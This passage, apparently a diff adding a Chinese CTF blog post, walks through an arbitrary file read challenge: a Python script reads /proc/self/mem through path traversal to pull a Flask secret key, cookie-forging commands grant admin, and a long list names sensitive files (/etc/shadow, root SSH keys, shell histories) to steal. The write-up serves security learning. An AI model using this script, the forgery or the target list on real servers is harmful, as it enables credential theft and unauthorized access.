+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        session<span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
+    <span class="token keyword">return</span> <span class="token string">"NoNoNo"</span>
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5637</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>debug关了，flag文件在导入到python上下文后就给删了</p>
+<p>看一下获取flag的条件，&#x2F;admin路由下伪造session为admin即可得到flag</p>
+<p>而key的生成是随机的：<code>app.config[&#39;SECRET_KEY&#39;] = str(uuid.uuid4()).replace(&quot;-&quot;, &quot;&quot;) + &quot;*abcdefgh&quot;</code></p>
+<p>但是 secret_key 的值可以通过内存数据获取：</p>
+<p>首先读取<code>../../../proc/self/maps</code>获取可读内容的内存映射地址</p>
+<p><img src="/blog/2023/05/20/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/image-20240517224456915.png" alt="image-20240517224456915"></p>
+<p>然后结合地址读取<code>../../../proc/self/mem</code>的内存数据</p>
+<p>exp：1.txt为读出来的地址内容</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re
+<span class="token keyword">import</span> requests
+
+maps <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">)</span>
+b <span class="token operator">=</span> maps<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token builtin">list</span> <span class="token operator">=</span> b<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\\n'</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> line <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token string">'rw'</span> <span class="token keyword">in</span> line<span class="token punctuation">:</span>
+        addr <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'([0-9a-f]+)-([0-9a-f]+)'</span><span class="token punctuation">,</span> line<span class="token punctuation">)</span>
+        <span class="token comment">#正则匹配地址,地址格式为十六进制数[0-9a-f],reserch会返回一个re.Match对象，用括号括起来是为了使用group()处理返回结果。</span>
+        start <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>addr<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment">#将十六进制字符转化为十进制数，为了符合start参数格式参考链接</span>
+        end <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>addr<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment">#将十六进制字符转化为十进制数，为了符合end参数格式</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> end<span class="token punctuation">)</span>
+        url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"http://61.147.171.105:52840/info?file=../../../proc/self/mem&amp;start=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>start<span class="token punctuation">&#125;</span></span><span class="token string">&amp;end=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>end<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
+        <span class="token comment">#使用start和end参数读取mem</span>
+        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+        secret_key <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>
+            <span class="token string">"[a-z0-9]&#123;32&#125;\*abcdefgh"</span><span class="token punctuation">,</span>
+            response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>  <span class="token comment">#uuid4()生成的字符串除去-符号后为固定的32字节（128bit），find</span>
+        <span class="token keyword">if</span> secret_key<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>secret_key<span class="token punctuation">)</span>
+            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/05/20/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/image-20240517225110139.png" alt="image-20240517225110139"></p>
+<p>得到key：<code>ba0c7fc2975143f483e2a7b446bc0d4d*abcdefgh</code></p>
+<p>我们尝试读一下最后的参数看看内容：<code>?file=../../../proc/self/mem&amp;start=140125915090944&amp;end=140125916344320</code></p>
+<p><img src="/blog/2023/05/20/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/image-20240517225148223.png" alt="image-20240517225148223"></p>
+<p>可以看到全局变量 secret_key 就在这里面</p>
+<p>接下来拿着key去伪造session即可，访问&#x2F;admin拿到session：<code>eyJhZG1pbiI6MH0.ZkdvPQ.2tiKlO-NZWGbWTKmCCyOwpHVM9M</code></p>
+<p>进行伪造</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python flask_session_cookie_manager3.py decode <span class="token parameter variable">-s</span> <span class="token string">"ba0c7fc2975143f483e2a7b446bc0d4d*abcdefgh"</span> <span class="token parameter variable">-c</span> <span class="token string">"eyJhZG1pbiI6MH0.ZkdvPQ.2tiKlO-NZWGbWTKmCCyOwpHVM9M"</span>
+
+python flask_session_cookie_manager3.py encode <span class="token parameter variable">-s</span> <span class="token string">"ba0c7fc2975143f483e2a7b446bc0d4d*abcdefgh"</span> <span class="token parameter variable">-t</span> <span class="token string">"&#123;'admin':1&#125;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/05/20/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/image-20240517225845389.png" alt="image-20240517225845389"></p>
+<p>得到flag</p>
+<p><img src="/blog/2023/05/20/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/image-20240517225956666.png" alt="image-20240517225956666"></p>
+<hr>
+<h1 id="一些敏感配置文件的路径"><a href="#一些敏感配置文件的路径" class="headerlink" title="一些敏感配置文件的路径"></a>一些敏感配置文件的路径</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>apache2<span class="token operator">/</span>conf<span class="token operator">/</span>httpd<span class="token operator">.</span>conf
+<span class="token operator">/</span>etc<span class="token operator">/</span>php<span class="token operator">/</span><span class="token number">7.4</span><span class="token operator">/</span>apache2<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>etc<span class="token operator">/</span>php<span class="token operator">/</span><span class="token number">7.2</span><span class="token operator">/</span>fpm<span class="token operator">/</span>php<span class="token operator">.</span>ini
+    
+<span class="token operator">/</span>apache<span class="token operator">/</span>apache<span class="token operator">/</span>conf<span class="token operator">/</span>httpd<span class="token operator">.</span>conf
+<span class="token operator">/</span>apache<span class="token operator">/</span>apache2<span class="token operator">/</span>conf<span class="token operator">/</span>httpd<span class="token operator">.</span>conf
+<span class="token operator">/</span>apache<span class="token operator">/</span>php<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>bin<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>etc<span class="token operator">/</span>anacrontab
+<span class="token operator">/</span>etc<span class="token operator">/</span>apache<span class="token operator">/</span>apache<span class="token operator">.</span>conf
+<span class="token operator">/</span>etc<span class="token operator">/</span>apache<span class="token operator">/</span>httpd<span class="token operator">.</span>conf
+<span class="token operator">/</span>etc<span class="token operator">/</span>apache2<span class="token operator">/</span>apache<span class="token operator">.</span>conf
+<span class="token operator">/</span>etc<span class="token operator">/</span>apache2<span class="token operator">/</span>httpd<span class="token operator">.</span>conf
+<span class="token operator">/</span>etc<span class="token operator">/</span>apache2<span class="token operator">/</span>sites<span class="token operator">-</span>available<span class="token operator">/</span><span class="token keyword">default</span>
+<span class="token operator">/</span>etc<span class="token operator">/</span>apache2<span class="token operator">/</span>vhosts<span class="token operator">.</span>d<span class="token operator">/</span><span class="token number">00</span>_default_vhost<span class="token operator">.</span>conf
+<span class="token operator">/</span>etc<span class="token operator">/</span>at<span class="token operator">.</span>allow
+<span class="token operator">/</span>etc<span class="token operator">/</span>at<span class="token operator">.</span>deny
+<span class="token operator">/</span>etc<span class="token operator">/</span>cron<span class="token operator">.</span>allow
+<span class="token operator">/</span>etc<span class="token operator">/</span>cron<span class="token operator">.</span>deny
+<span class="token operator">/</span>etc<span class="token operator">/</span>crontab
+<span class="token operator">/</span>etc<span class="token operator">/</span>fstab
+<span class="token operator">/</span>etc<span class="token operator">/</span>host<span class="token operator">.</span>conf
+<span class="token operator">/</span>etc<span class="token operator">/</span>httpd<span class="token operator">/</span>conf<span class="token operator">.</span>d<span class="token operator">/</span>httpd<span class="token operator">.</span>conf
+<span class="token operator">/</span>etc<span class="token operator">/</span>httpd<span class="token operator">/</span>conf<span class="token operator">.</span>d<span class="token operator">/</span>php<span class="token operator">.</span>conf
+<span class="token operator">/</span>etc<span class="token operator">/</span>httpd<span class="token operator">/</span>conf<span class="token operator">/</span>httpd<span class="token operator">.</span>conf
+<span class="token operator">/</span>etc<span class="token operator">/</span>httpd<span class="token operator">/</span>htdocs<span class="token operator">/</span>index<span class="token operator">.</span>html
+<span class="token operator">/</span>etc<span class="token operator">/</span>httpd<span class="token operator">/</span>htdocs<span class="token operator">/</span>index<span class="token operator">.</span>php
+<span class="token operator">/</span>etc<span class="token operator">/</span>httpd<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token operator">.</span>log
+<span class="token operator">/</span>etc<span class="token operator">/</span>httpd<span class="token operator">/</span>logs<span class="token operator">/</span>access_log
+<span class="token operator">/</span>etc<span class="token operator">/</span>httpd<span class="token operator">/</span>logs<span class="token operator">/</span>error<span class="token operator">.</span>log
+<span class="token operator">/</span>etc<span class="token operator">/</span>httpd<span class="token operator">/</span>logs<span class="token operator">/</span>error_log
+<span class="token operator">/</span>etc<span class="token operator">/</span>httpd<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>etc<span class="token operator">/</span>init<span class="token operator">.</span>d<span class="token operator">/</span>httpd
+<span class="token operator">/</span>etc<span class="token operator">/</span>init<span class="token operator">.</span>d<span class="token operator">/</span>mysql
+<span class="token operator">/</span>etc<span class="token operator">/</span>ld<span class="token operator">.</span>so<span class="token operator">.</span>conf
+<span class="token operator">/</span>etc<span class="token operator">/</span>motd
+<span class="token operator">/</span>etc<span class="token operator">/</span>my<span class="token operator">.</span>cnf
+<span class="token operator">/</span>etc<span class="token operator">/</span>mysql<span class="token operator">/</span>my<span class="token operator">.</span>cnf
+<span class="token operator">/</span>etc<span class="token operator">/</span>mysql<span class="token operator">/</span>my<span class="token operator">.</span>cnf
+<span class="token operator">/</span>etc<span class="token operator">/</span>network<span class="token operator">/</span>interfaces
+<span class="token operator">/</span>etc<span class="token operator">/</span>networks
+<span class="token operator">/</span>etc<span class="token operator">/</span>passwd
+<span class="token operator">/</span>etc<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>etc<span class="token operator">/</span>php<span class="token operator">/</span>apache<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>etc<span class="token operator">/</span>php<span class="token operator">/</span>apache2<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>etc<span class="token operator">/</span>php<span class="token operator">/</span>cgi<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>etc<span class="token operator">/</span>php<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>etc<span class="token operator">/</span>php<span class="token operator">/</span>php4<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>etc<span class="token operator">/</span>php4<span class="token operator">.</span><span class="token number">4</span><span class="token operator">/</span>fcgi<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>etc<span class="token operator">/</span>php4<span class="token operator">/</span>apache<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>etc<span class="token operator">/</span>php4<span class="token operator">/</span>apache2<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>etc<span class="token operator">/</span>php4<span class="token operator">/</span>cgi<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>etc<span class="token operator">/</span>php5<span class="token operator">/</span>apache<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>etc<span class="token operator">/</span>php5<span class="token operator">/</span>apache2<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>etc<span class="token operator">/</span>php5<span class="token operator">/</span>cgi<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>etc<span class="token operator">/</span>phpmyadmin<span class="token operator">/</span>config<span class="token operator">.</span>inc<span class="token operator">.</span>php
+<span class="token operator">/</span>etc<span class="token operator">/</span>resolv<span class="token operator">.</span>conf
+<span class="token operator">/</span>etc<span class="token operator">/</span>shadow
+<span class="token operator">/</span>etc<span class="token operator">/</span>ssh<span class="token operator">/</span>sshd_config
+<span class="token operator">/</span>etc<span class="token operator">/</span>ssh<span class="token operator">/</span>sshd_config
+<span class="token operator">/</span>etc<span class="token operator">/</span>ssh<span class="token operator">/</span>ssh_config
+<span class="token operator">/</span>etc<span class="token operator">/</span>ssh<span class="token operator">/</span>ssh_config
+<span class="token operator">/</span>etc<span class="token operator">/</span>ssh<span class="token operator">/</span>ssh_host_dsa_key
+<span class="token operator">/</span>etc<span class="token operator">/</span>ssh<span class="token operator">/</span>ssh_host_dsa_key
+<span class="token operator">/</span>etc<span class="token operator">/</span>ssh<span class="token operator">/</span>ssh_host_dsa_key<span class="token operator">.</span>pub
+<span class="token operator">/</span>etc<span class="token operator">/</span>ssh<span class="token operator">/</span>ssh_host_dsa_key<span class="token operator">.</span>pub
+<span class="token operator">/</span>etc<span class="token operator">/</span>ssh<span class="token operator">/</span>ssh_host_key
+<span class="token operator">/</span>etc<span class="token operator">/</span>ssh<span class="token operator">/</span>ssh_host_key
+<span class="token operator">/</span>etc<span class="token operator">/</span>ssh<span class="token operator">/</span>ssh_host_key<span class="token operator">.</span>pub
+<span class="token operator">/</span>etc<span class="token operator">/</span>ssh<span class="token operator">/</span>ssh_host_key<span class="token operator">.</span>pub
+<span class="token operator">/</span>etc<span class="token operator">/</span>ssh<span class="token operator">/</span>ssh_host_rsa_key
+<span class="token operator">/</span>etc<span class="token operator">/</span>ssh<span class="token operator">/</span>ssh_host_rsa_key
+<span class="token operator">/</span>etc<span class="token operator">/</span>ssh<span class="token operator">/</span>ssh_host_rsa_key<span class="token operator">.</span>pub
+<span class="token operator">/</span>etc<span class="token operator">/</span>ssh<span class="token operator">/</span>ssh_host_rsa_key<span class="token operator">.</span>pub
+<span class="token operator">/</span>etc<span class="token operator">/</span>sysconfig<span class="token operator">/</span>network
+<span class="token operator">/</span>etc<span class="token operator">/</span>sysconfig<span class="token operator">/</span>network
+<span class="token operator">/</span>home<span class="token operator">/</span>apache<span class="token operator">/</span>conf<span class="token operator">/</span>httpd<span class="token operator">.</span>conf
+<span class="token operator">/</span>home<span class="token operator">/</span>apache2<span class="token operator">/</span>conf<span class="token operator">/</span>httpd<span class="token operator">.</span>conf
+<span class="token operator">/</span>home<span class="token operator">/</span>bin<span class="token operator">/</span>stable<span class="token operator">/</span>apache<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>home2<span class="token operator">/</span>bin<span class="token operator">/</span>stable<span class="token operator">/</span>apache<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>NetServer<span class="token operator">/</span>bin<span class="token operator">/</span>stable<span class="token operator">/</span>apache<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>opt<span class="token operator">/</span>www<span class="token operator">/</span>conf<span class="token operator">/</span>httpd<span class="token operator">.</span>conf
+<span class="token operator">/</span>opt<span class="token operator">/</span>www<span class="token operator">/</span>htdocs<span class="token operator">/</span>index<span class="token operator">.</span>html
+<span class="token operator">/</span>opt<span class="token operator">/</span>www<span class="token operator">/</span>htdocs<span class="token operator">/</span>index<span class="token operator">.</span>php
+<span class="token operator">/</span>opt<span class="token operator">/</span>xampp<span class="token operator">/</span>etc<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span><span class="token constant">PHP</span><span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>php<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>php4<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>php5<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>root<span class="token operator">/</span><span class="token operator">.</span>atftp_history
+<span class="token operator">/</span>root<span class="token operator">/</span><span class="token operator">.</span>bashrc
+<span class="token operator">/</span>root<span class="token operator">/</span><span class="token operator">.</span>bash_history
+<span class="token operator">/</span>root<span class="token operator">/</span><span class="token operator">.</span>mysql_history
+<span class="token operator">/</span>root<span class="token operator">/</span><span class="token operator">.</span>nano_history
+<span class="token operator">/</span>root<span class="token operator">/</span><span class="token operator">.</span>php_history
+<span class="token operator">/</span>root<span class="token operator">/</span><span class="token operator">.</span>profile
+<span class="token operator">/</span>root<span class="token operator">/</span><span class="token operator">.</span>ssh<span class="token operator">/</span>authorized_keys
+<span class="token operator">/</span>root<span class="token operator">/</span><span class="token operator">.</span>ssh<span class="token operator">/</span>identity
+<span class="token operator">/</span>root<span class="token operator">/</span><span class="token operator">.</span>ssh<span class="token operator">/</span>identity<span class="token operator">.</span>pub
+<span class="token operator">/</span>root<span class="token operator">/</span><span class="token operator">.</span>ssh<span class="token operator">/</span>id_dsa
+<span class="token operator">/</span>root<span class="token operator">/</span><span class="token operator">.</span>ssh<span class="token operator">/</span>id_dsa<span class="token operator">.</span>pub
+<span class="token operator">/</span>root<span class="token operator">/</span><span class="token operator">.</span>ssh<span class="token operator">/</span>id_rsa
+<span class="token operator">/</span>root<span class="token operator">/</span><span class="token operator">.</span>ssh<span class="token operator">/</span>id_rsa<span class="token operator">.</span>pub
+<span class="token operator">/</span>root<span class="token operator">/</span>anaconda<span class="token operator">-</span>ks<span class="token operator">.</span>cfg
+<span class="token operator">/</span>tmp<span class="token operator">/</span>apache<span class="token operator">/</span>htdocs<span class="token operator">/</span>index<span class="token operator">.</span>html
+<span class="token operator">/</span>tmp<span class="token operator">/</span>apache<span class="token operator">/</span>htdocs<span class="token operator">/</span>index<span class="token operator">.</span>php
+<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>apache<span class="token operator">/</span>conf<span class="token operator">/</span>httpd<span class="token operator">.</span>conf
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>apache<span class="token operator">/</span>conf<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>apache<span class="token operator">/</span>htdocs<span class="token operator">/</span>index<span class="token operator">.</span>html
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>apache<span class="token operator">/</span>htdocs<span class="token operator">/</span>index<span class="token operator">.</span>php
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>apache<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token operator">.</span>log
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>apache<span class="token operator">/</span>logs<span class="token operator">/</span>access_log
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>apache<span class="token operator">/</span>logs<span class="token operator">/</span>access_logaccess_log<span class="token operator">.</span>old
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>apache<span class="token operator">/</span>logs<span class="token operator">/</span>error<span class="token operator">.</span>log
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>apache<span class="token operator">/</span>logs<span class="token operator">/</span>error_log
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>apache<span class="token operator">/</span>logs<span class="token operator">/</span>error_logerror_log<span class="token operator">.</span>old
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>apache2<span class="token operator">/</span>conf<span class="token operator">/</span>httpd<span class="token operator">.</span>conf
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>apache2<span class="token operator">/</span>conf<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>apache2<span class="token operator">/</span>htdocs<span class="token operator">/</span>index<span class="token operator">.</span>html
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>apache2<span class="token operator">/</span>htdocs<span class="token operator">/</span>index<span class="token operator">.</span>php
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>cpanel<span class="token operator">/</span>logs
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>cpanel<span class="token operator">/</span>logs<span class="token operator">/</span>access_log
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>cpanel<span class="token operator">/</span>logs<span class="token operator">/</span>error_log
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>cpanel<span class="token operator">/</span>logs<span class="token operator">/</span>license_log
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>cpanel<span class="token operator">/</span>logs<span class="token operator">/</span>login_log
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>cpanel<span class="token operator">/</span>logs<span class="token operator">/</span>stats_log
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>cpanel<span class="token operator">/</span>logs<span class="token operator">/</span>stats_log
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>etc<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>httpd<span class="token operator">/</span>conf<span class="token operator">/</span>httpd<span class="token operator">.</span>conf
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>httpd2<span class="token operator">.</span><span class="token number">2</span><span class="token operator">/</span>htdocs<span class="token operator">/</span>index<span class="token operator">.</span>html
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>httpd2<span class="token operator">.</span><span class="token number">2</span><span class="token operator">/</span>htdocs<span class="token operator">/</span>index<span class="token operator">.</span>php
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>mysql<span class="token operator">/</span>bin<span class="token operator">/</span>mysql
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>mysql<span class="token operator">/</span>my<span class="token operator">.</span>cnf
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>php<span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>php4<span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>php4<span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>php4<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>php5<span class="token operator">/</span>etc<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>php5<span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>php5<span class="token operator">/</span>php5<span class="token operator">.</span>ini
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>share<span class="token operator">/</span>examples<span class="token operator">/</span>php<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>share<span class="token operator">/</span>examples<span class="token operator">/</span>php4<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>tomcat5527<span class="token operator">/</span>bin<span class="token operator">/</span>version<span class="token operator">.</span>sh
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>Zend<span class="token operator">/</span>etc<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>tomcat6<span class="token operator">/</span>bin<span class="token operator">/</span>startup<span class="token operator">.</span>sh
+<span class="token operator">/</span>usr<span class="token operator">/</span>tomcat6<span class="token operator">/</span>bin<span class="token operator">/</span>startup<span class="token operator">.</span>sh
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>apache2<span class="token operator">/</span>config<span class="token operator">.</span>inc
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>httpd<span class="token operator">/</span>conf<span class="token operator">/</span>httpd<span class="token operator">.</span>conf
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>httpd<span class="token operator">/</span>conf<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>httpd<span class="token operator">/</span>conf<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>httpd<span class="token operator">/</span>htdocs<span class="token operator">/</span>index<span class="token operator">.</span>html
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>httpd<span class="token operator">/</span>htdocs<span class="token operator">/</span>index<span class="token operator">.</span>php
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>mysql<span class="token operator">/</span>my<span class="token operator">.</span>cnf
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>mysql<span class="token operator">/</span>mysql<span class="token operator">/</span>user<span class="token operator">.</span><span class="token constant">MYD</span>
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>local<span class="token operator">/</span>www<span class="token operator">/</span>conf<span class="token operator">/</span>httpd<span class="token operator">.</span>conf
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>local<span class="token operator">/</span>www<span class="token operator">/</span>conf<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log<span class="token operator">/</span>access<span class="token operator">.</span>log
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log<span class="token operator">/</span>access_log
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log<span class="token operator">/</span>apache<span class="token operator">/</span>access<span class="token operator">.</span>log
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log<span class="token operator">/</span>apache<span class="token operator">/</span>access_log
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log<span class="token operator">/</span>apache<span class="token operator">/</span>error<span class="token operator">.</span>log
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log<span class="token operator">/</span>apache<span class="token operator">/</span>error_log
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log<span class="token operator">/</span>apache2<span class="token operator">/</span>access<span class="token operator">.</span>log
